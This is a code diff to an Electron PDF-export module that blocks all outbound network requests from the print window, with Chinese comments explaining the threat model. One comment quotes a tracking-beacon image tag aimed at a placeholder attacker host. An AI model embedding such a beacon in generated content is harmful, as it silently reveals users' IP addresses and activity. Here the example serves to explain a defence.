@@ -1,4 +1,4 @@
-import { BrowserWindow, dialog, shell } from 'electron';
+import { BrowserWindow, dialog, session, shell } from 'electron';
 import { mkdtemp, rm, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
@@ -22,6 +22,43 @@ import { join } from 'node:path';
  * 🔴 **打印窗口必须 `show: false` 且 `offscreen` 不开。**
  * 开了离屏渲染反而拿不到完整分页；不 `show:false` 会闪一个空白窗口出来。
  */
+
+/**
+ * 打印窗口专用分区。**不带 `persist:` 前缀 = 纯内存分区**，
+ * 进程退出就没了，也和主窗口、渲染代理的会话完全隔开（不共享 cookie）。
+ */
+const PRINT_PARTITION = 'synorive-pdf-print';
+
+/** 出网闸只装一次。分区 session 在应用生命周期内是同一个对象 */
+let printNetLocked = false;
+
+/**
+ * 🔴 **打印窗口一个字节都不许出网。**
+ *
+ * 这份 HTML 是引擎生成的，但它里面**嵌着从公网抓来的摘录**（见文件头）。
+ * `javascript: false` 挡住了脚本，可 `images: true` 是必须的（版面），
+ * 于是摘录里一句 `<img src="https://攻击者/beacon?id=…">` 就成立了：
+ * 用户每导出一次 PDF，攻击者就收到一次"这个 IP 在这个时刻导出了这份资料"。
+ * 对一个主打"资料不出本机"的工具，这是实打实的去匿名化 ——
+ * 而且它完全静默：PDF 出来了、图没显示出来也只像是"那张图挂了"。
+ *
+ * 所以在会话层直接掐断：`file:` / `data:` / `blob:` / `about:` 放行
+ * （本地内容和 Chromium 自己的内部请求），其余一律 cancel。
+ * 这比写 CSP 可靠 —— CSP 要靠 HTML 里的 meta 标签，
+ * 而这份 HTML 的头部是引擎那边生成的，不在这个文件的控制范围内。
+ */
+function printSession(): Electron.Session {
+  const ses = session.fromPartition(PRINT_PARTITION);
+  if (!printNetLocked) {
+    ses.webRequest.onBeforeRequest((details, cb) => {
+      const ok = /^(?:file|data|blob|about|devtools|chrome|chrome-extension):/i.test(details.url);
+      if (!ok) console.warn(`[pdf] 打印窗口的出网请求已拦下：${details.url.slice(0, 200)}`);
+      cb({ cancel: !ok });
+    });
+    printNetLocked = true;
+  }
+  return ses;
+}
 
 export interface PdfResult {
   ok: boolean;
@@ -52,6 +89,10 @@ export async function exportPdf(html: string, defaultName: string): Promise<PdfR
     const srcPath = join(dir, 'doc.html');
     await writeFile(srcPath, withPrintCss(html), 'utf8');
 
+    // 建窗口之前先把出网闸装好 —— 装晚了的话第一次导出的那一份
+    // 仍然会把信标发出去，而且只发那一次，事后完全查不出来
+    printSession();
+
     printer = new BrowserWindow({
       show: false,
       webPreferences: {
@@ -62,8 +103,16 @@ export async function exportPdf(html: string, defaultName: string): Promise<PdfR
         javascript: false,
         images: true,
         sandbox: true,
+        // 专用内存分区 + 上面那道出网闸。见 printSession() 的注释
+        partition: PRINT_PARTITION,
       },
     });
+
+    // javascript:false 已经堵掉了 window.open，但窗口层面再锁一道：
+    // 这份 HTML 里的 <a> 是可点的（PDF 里要保留链接注解），
+    // 而"打印窗口"这个上下文永远不该真的导航到任何地方
+    printer.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));
+    printer.webContents.on('will-navigate', (e) => e.preventDefault());
 
     await printer.loadFile(srcPath);
     // 字体还在下载时就打印，会得到一份回退字体排版的 PDF（中文变方块）。
